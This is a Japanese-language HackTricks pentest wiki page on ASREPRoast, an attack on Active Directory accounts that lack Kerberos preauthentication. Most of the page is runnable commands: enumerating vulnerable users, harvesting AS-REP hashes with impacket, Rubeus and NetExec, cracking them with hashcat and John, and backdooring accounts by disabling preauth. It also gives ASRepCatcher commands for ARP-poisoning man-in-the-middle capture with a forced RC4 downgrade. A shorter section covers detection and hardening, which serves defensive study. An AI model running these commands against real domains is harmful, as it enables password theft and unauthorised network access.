# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoastは、**Kerberos pre-authentication required attribute**を持たないユーザーを悪用するsecurity attackです。基本的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせず、Domain Controller（DC）に対してユーザーの認証を要求できます。その後、DCはユーザーのパスワードから導出されたキーで暗号化されたメッセージを応答します。攻撃者はこれをofflineでcrackし、ユーザーのパスワードを特定できます。

このattackの主な要件は次のとおりです。

- **Kerberos pre-authenticationの欠如**: 対象ユーザーでこのsecurity featureが有効になっていない必要があります。
- **Domain Controller（DC）への接続**: 攻撃者はDCにアクセスしてリクエストを送信し、暗号化されたメッセージを受信する必要があります。
- **Optional domain account**: domain accountがあると、LDAPクエリを通じて脆弱なユーザーをより効率的に特定できます。アカウントがない場合、攻撃者はユーザー名を推測する必要があります。

#### 脆弱なユーザーの列挙（domain credentialsが必要）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP message のリクエスト
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus はデフォルトで **RC4** を要求するため、Event ID **4768** には通常 **preauth type 0** と **ticket encryption type 0x17** が表示されます。**`/aes`** を追加した場合（または対象で RC4 が無効化されている場合）は、代わりに **AES etypes** が使用されます。<sup>[[2]](#references)</sup>

#### クイック one-liners (Linux)

- まず Kerberos userenum で潜在的な対象を列挙します（例: leaked build paths から）。`kerbrute userenum users.txt -d domain --dc dc.domain`
- 有効な creds なしで、NetExec を使って username リスト全体を Roast します。`netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- creds がある場合は、NetExec に LDAP をクエリさせ、Roast 可能なすべてのアカウントを要求します。`netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 出力が **`$krb5asrep$23$`** で始まる場合は、Hashcat **`-m 18200`** で crack します。**`$krb5asrep$17$`** または **`$krb5asrep$18$`** で始まる場合は、John **`--format=krb5asrep`** を優先します。<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

すべての AS-REP roast が RC4 だとは考えないでください。最新の tool は、要求またはネゴシエーションされた enctype に応じて、**RC4**（`$krb5asrep$23$`）または **AES**（`$krb5asrep$17$` / `$krb5asrep$18$`）を返すことがあります。**`hashcat -m 18200`** は **etype 23** 用であり、**John** は **17/18/23** の `krb5asrep` を直接処理できます。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、**preauth** を不要に設定する:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### 検知と hardening

成功した roast は、DC 上で `Status=0x0` および `PreAuthType=0` の **4768** イベントを生成します。検知時に RC4 を必須条件にしないでください。`TicketEncryptionType=0x17` は弱い暗号化を示す有用なシグナルですが、攻撃者は AES（イベントログ値 `0x11`/`0x12`）を要求できます。2025 年 1 月 14 日以降の累積更新プログラムが適用された Windows Server 2016 以降では、イベント 4768 のバージョン 2 に `ClientAdvertizedEncryptionTypes`、アカウントおよび DC がサポートする etype、利用可能な鍵も記録されます。<sup>[[5]](#references)</sup>

実用的な hunt では、アカウントに AES 鍵があるにもかかわらず RC4 のみを広告しているクライアントを検出し、その後、複数の no-preauth ユーザーに対して 1 つの送信元 IP から発生したバーストを相関させます。すべての `PreAuthType=0` イベントで alerting するのではなく、正当な例外をベースライン化してください。

恒久的な対策は、厳密に必要としないすべてのユーザーで **Do not require Kerberos preauthentication** を解除し、漏洩したアカウントのパスワードをローテーションすることです。例外を削除できない場合は、長くランダムに生成したパスワードを使用し、権限を最小限にしてください。RC4 を無効化すると cracking のコストは上がりますが、AES の AS-REP 応答は引き続き offline-crackable であるため、roastability はなくなりません。<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast without credentials

on-path attacker は、通常の preauthenticated AS 交換中に返される AS-REP を取得し、その暗号化部分を offline cracking 用に整形できます。classic ASREPRoasting とは異なり、これは `DONT_REQ_PREAUTH` を必要としません。ただし、実際に Kerberos 交換を傍受できたアカウントだけが対象になります。**ASRepCatcher** はデフォルトで one-way ARP poisoning によりその位置を取得します。また、`--disable-spoofing` を使えば、別の MitM technique から取得した traffic を処理できます。<sup>[[6]](#references)</sup>\
no-preauth principal から **TGT** ではなく **service ticket** を返す、関連する credential なしの trick については、[Kerberoast](kerberoast.md) を参照してください。

`relay` mode では、[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) が傍受した AS-REQ を転送し、双方がまだ許可している場合は **RC4** を強制します。`listen` は packet を変更しないため、client と DC が negotiation した enctype がそのまま取得されます。可能な場合は、サブネット全体に触れるのではなく、`-t`/`-tf` で poisoning の scope を指定してください。<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – イベント 4768: Kerberos 認証チケットが要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
